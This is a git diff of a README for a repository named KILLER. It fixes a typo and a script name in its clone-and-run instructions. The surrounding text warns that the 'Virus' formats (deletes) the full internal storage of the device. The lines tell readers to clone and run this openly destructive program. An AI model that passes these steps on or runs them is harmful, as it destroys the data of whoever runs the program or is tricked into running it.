@@ -34,9 +34,9 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 * `git clone https://github.com/Alienrazor/KILLER`
 * `cd $HOME`
 * `ls`
-* `cd KILLER
+* `cd KILLER`
 * `ls`
-* `python kill.py`
+* `python KILL.py`
 ```
 [+]-- Now you need internet connection to continue further process...
 [+]-- You can select any option by clicking on your keyboard
